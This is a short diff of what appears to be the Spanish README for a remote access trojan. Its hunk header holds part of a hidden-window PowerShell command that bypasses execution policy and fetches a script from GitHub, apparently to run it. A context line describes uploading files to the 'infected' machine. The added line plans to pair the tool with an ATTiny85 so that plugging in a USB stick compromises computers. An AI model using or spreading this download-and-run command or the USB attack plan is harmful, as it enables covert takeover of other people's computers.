@@ -31,4 +31,4 @@ powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.c
 - upload: sube ficheros al infectado
 
 # Ideas
-Usa
+Integrar con un ATTiny85 (https://www.amazon.es/dp/B076KS2QDS?ref=ppx_yo2ov_dt_b_fed_asin_title&th=1) para comprometer equipos pinchando un usb.
